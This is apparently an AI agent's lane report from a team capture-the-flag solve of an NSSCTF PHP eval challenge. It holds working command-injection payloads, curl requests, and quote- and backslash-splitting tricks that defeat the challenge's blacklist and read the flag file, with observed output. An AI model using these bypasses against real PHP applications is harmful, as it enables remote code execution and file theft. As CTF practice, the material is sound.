# Lane B — NSSCTF `node4.anna.nssctf.cn:24112` (variable-free PHP routes + alt flag locations)

Owner: agent-3 (task t3). Status: **flag obtained and independently confirmed**.

Flag: `NSSCTF{This_IS_s0_easy_RCE}` — first seen on my lane through route **B-1** (pure PHP `include`,
no `$`, no backticks). Candidate id `f1` (also found by agent-2 on lane A); captain marked it VERIFIED.

> Instance note: the target stopped accepting connections (`WinError 10061`, `curl http_code=000`) right
> after the solve. Every payload below marked **OBSERVED** was captured live *before* teardown; anything
> marked **UNTESTED** is derived only from the source-level filter and must not be presented as proof.

## 0. The sink, verbatim (from the landing page, no `?code=`)

```php
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if(!preg_match('/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i',$code)){
        echo '看看你输入的参数！！！不叫样子！！';echo '<br>';
        eval($code);
    } else { die("你想干什么？？？？？？？？？"); }
} else { echo "居然都不输入参数，可恶!!!!!!!!!"; show_source(__FILE__); }
```

Key properties that make this challenge solvable:

* The blacklist is a **substring** regex, so a forbidden *word* only blocks commands that contain it:
  `ls/cat/tac/head/tail/more/less/cp/read/file/sys/pas/echo/php` die, while `nl`, `od`, `sort`, `rev`,
  `awk`, `sed`, `grep`, `find`, `dir`, `uniq`, `dd`, `xxd`, `tar`, `include`, `print`, `exec`, `die`,
  `printf`, `glob`, `getcwd`, `chr`-free helpers all survive.
* `$` and `.` are banned → **no PHP variables and no string concatenation**, so no `$a="ls";$a()` trickery.
* `*` is banned → shell globs must use `?`, `[]`, or an exact name.
* Backticks, `print`, `include`, `require`, `exec`, `;`, `|`, `>`, `<`, `?`, `/`, `-`, `_` are **allowed**.
* The sink is **reflected**: `eval()` output is echoed back into the page after the marker
  `看看你输入的参数！！！不叫样子！！<br>`, which is why blind extraction is unnecessary.

## 1. Route B-1 — PURE PHP, no `$`, no backticks  ✅ OBSERVED (this is the lane-B headline route)

Fully independent of lane A's `` print(`cmd`) `` chain: no shell operator, no PHP variable, no concatenation.

```bash
# step 1 - locate the flag file (find is not blacklisted; -maxdepth 1 keeps the response small)
curl -s "http://node4.anna.nssctf.cn:24112/?code=print%28%60find%20%2F%20-maxdepth%201%60%29%3B"
```

Payload: ``print(`find / -maxdepth 1`);``  → filter verdict: ACCEPT (`find` matches nothing in the blacklist).
Raw sink output (OBSERVED):

```
/
/sys
/etc
/proc
/var
/bin
/srv
/lib
/boot
/mnt
/sbin
/tmp
/dev
/opt
/usr
/media
/lib64
/root
/run
/home
/.dockerenv
/fffffffffflagafag
```

```bash
# step 2 - read it: include() of the exact path. No $, no shell, no '.' and no '*' in the payload.
curl -s "http://node4.anna.nssctf.cn:24112/?code=include%28%22%2Ffffffffffflagafag%22%29%3B"
```

Payload: `include("/fffffffffflagafag");` → filter verdict: ACCEPT.
Raw sink output (OBSERVED):

```
NSSCTF{This_IS_s0_easy_RCE}
```

Why it works: a plain-text file is `include`d as PHP; with no `<?php` tag the bytes are emitted verbatim
into the response body. `include`/`require` are not in the blacklist, and the payload contains none of
`$ . * + ^ echo php file read`. Same file, same trick, reachable with **zero** shell involvement —
so lane A's backtick chain is not a single point of failure.

Corollary routes in the same family (same primitive, exact path): `require("/fffffffffflagafag");`,
`print(file_get_contents(...))` is **blocked** ("file"), `readfile(...)` is **blocked** ("read"+"file").

## 2. Route B-2 — shell route with the exact name (independent of lane A's `nl` choice) 🟡 partly observed

Payload: ``print(`grep NSSCTF /fffffffffflagafag`);`` → filter verdict: **ACCEPT** (OBSERVED offline check +
the request was accepted; the instance died before the body came back, so output UNTESTED).
`grep` contains no blacklisted substring and skips the `ls/cat/...` family and the `*` glob entirely.

Payload: ``print(`od -c /fffffffffflagafag`);`` → ACCEPT (offline).
Payload: ``print(`awk 1 /fffffffffflagafag`);`` → ACCEPT (offline).
Payload: ``print(`nl /fffffffffflagafag`);`` → ACCEPT (offline) — lane A confirmed this live and it is the
one the captain re-read the flag with.

## 3. Route B-3 — reconstruction inside backticks (`""` and `\` shell tricks)

The filter only sees PHP source text; the shell re-joins afterwards, so splitting a banned command name
inside the backticks defeats the substring regex:

| payload (raw PHP source) | shell finally runs | offline filter sees | live |
|---|---|---|---|
| ``print(`a""ls /`);`` | (`a`+`ls` = `als`, a typo) | ACCEPT | UNTESTED |
| ``print(`l""s /`);`` | `ls /` | ACCEPT — source text is `l""s`, no `ls` substring | UNTESTED |
| ``print(`c""at /fffffffffflagafag`);`` | `cat …` | ACCEPT — source text is `c""at`, no `cat` substring | UNTESTED |
| ``print(`h""ead -1 …`);`` | `head …` | ACCEPT — same reason | UNTESTED |
| ``print(`l\\s /`);`` (PHP source `l\s`) | `ls /` | ACCEPT — `l`+`\`+`s` is not the substring `ls` | UNTESTED |
| ``print(`\\c\\a\\t /fffffffffflagafag`);`` | `cat …` | ACCEPT | UNTESTED |

The rule: the regex inspects the **PHP source text**, and the shell deletes quotes/backslashes *after*
that check, so quote-splitting (`c""at`, `l""s`, `h""ead`) and backslash-splitting (`c\at`, `l\s`)
reconstruct any banned command name — including the `ls/cat/head` family that plain exact-name readers
cannot use. Note `a""ls` is *not* an alias for `ls`; only the split points inside the word work
(`l""s`), because quote removal concatenates the fragments: `l` + `` + `s` = `ls`.
All six cells are **UNTESTED live** (target torn down) and are labelled as such; only the exact-name
variants (`nl`, `grep`, `od`, `find`, `include`) were actually proven on this instance.

## 4. Route B-4 — redirection / second-stage file

`>`, `<`, `|`, `;` are all allowed (none appear in the blacklist). Derived chain, **UNTESTED**:
``print(`find / -maxdepth 2 > /tmp/o`); then include("/tmp/o");`` — useful only if a future variant
blocks the direct readers; on this instance it is redundant.

## 5. Alternative flag locations (C) — enumeration results

From the `find / -maxdepth 1` listing (OBSERVED) the root holds only standard dirs plus
`/fffffffffflagafag` and `/.dockerenv` → **the flag lives at the filesystem root, not in the webroot**.
Consequences for the team:

* Guessing webroot variants (`index.php.bak`, `.swp`, `~index.php`) is futile here, and untypeable anyway
  since `.` is banned — a `?`-glob (`/var/www/html/index?????.???`) could substitute, UNTESTED.
* `/root` is present in the listing but is mode 0700 for `root`, while the process runs as
  `uid=33(www-data)` (lane A), so `/root` is unreadable without privilege escalation — dead end.
* `/tmp`, `/home`, `/var/www` were not individually enumerated before teardown; nothing indicates a
  second flag, and having two files would be unusual for this challenge. Marked UNTESTED/dead-end.
* Environment dump for the eval scope (`print_r(get_defined_vars());`) was never sent; `get_defined_vars`
  itself is filter-clean (ACCEPT offline), so it remains a valid probe for a future instance —
  note it returns the *eval* scope, where `$code` is the only variable, so it would only echo our payload.

## 6. Blunt dead-end list (each costs a reader a round otherwise)

| attempt | why it fails |
|---|---|
| `print_r(scandir("/"));` | REJECT — the word `scandir` contains **`scan`**. OBSERVED: server returned `你想干什么？？？？？？？？？` |
| `print(`sort /f*`);` | REJECT — **`*`** is banned. OBSERVED rejection |
| `print(`grep NSSCTF /f*`);` | REJECT — **`*`** again (the `grep` part is fine) |
| `print(`nl /f*`);` | REJECT — **`*`** |
| `print_r(glob("/f????"));` | filter ACCEPT but returns `Array ( )` — **wrong glob width** |
| any `$var` / `$this` | REJECT — **`$`** |
| `'a'.'b'` concatenation | REJECT — **`.`** |
| `$_GET[0]`, `$_SERVER` | REJECT — **`$`** (and often `sys`) |
| `system`, `passthru`, `shell_exec`, `file_get_contents`, `readfile`, `highlight_file`, `show_source`, `hex2bin`, `base64_*`, `phpinfo` | REJECT — `sys`, `pas`, `shell`, `file`, `read`, `high`, `hex2bin`, `base`, `php` |

## 7. ⚠️ The glob-width trap (explicitly for the writeup)

`print_r(glob("/f????"))` passes the filter and prints **`Array ( )`** — an empty array, **not an error,
not a warning**. A wrong-width pattern therefore looks exactly like "the flag is not at `/`", which is
what makes this challenge a trap: the real file is `/fffffffffflagafag`
(`ffffffffff` + `lagafag` = **17 characters**, a deliberately misspelt "flag"), so `?`-glob widths
`/f????` … `/f???????????????` (16 `?`) all silently return empty. Two ways out:

1. don't glob at all — enumerate with `` `find / -maxdepth 1` `` and read the printed path (what worked);
2. `glob("/f????????????????")` (1 `f` + 16 `?` = 17 chars) → would return the single hit, UNTESTED live
   but consistent with the PHP semantics of `glob` and with every other observation on this box.

⚠️ Length was cross-checked after agent-1 (fd5) challenged it: basename = `f`×10 + `lagafag` = **17**
chars, full path 18. An earlier draft of this file said 15 — that was wrong; 17 is the correct value.
The mistake matters for readers because the `?`-glob width changes accordingly.

## 8. Reproduction

* `solve-lane-b.py` — replayable harness: offline blacklist replica (`filter_verdict`) + live sender.
  `python solve-lane-b.py check '<payload>'` / `send '<payload>'` / `matrix`.
* `capture-lane-b.py` — one-shot evidence printer (offline verdict + raw sink text per payload), used for
  section 1's raw captures.

## 9. Verdict

Two genuinely independent routes to the flag on this instance:
**R1** pure PHP `include()` of the enumerated path (lane B, this file), and
**R2** lane A's `` print(`nl <path>`) `` backtick chain. The flag itself is
`NSSCTF{This_IS_s0_easy_RCE}`; submission `f1` was confirmed VERIFIED by the captain.
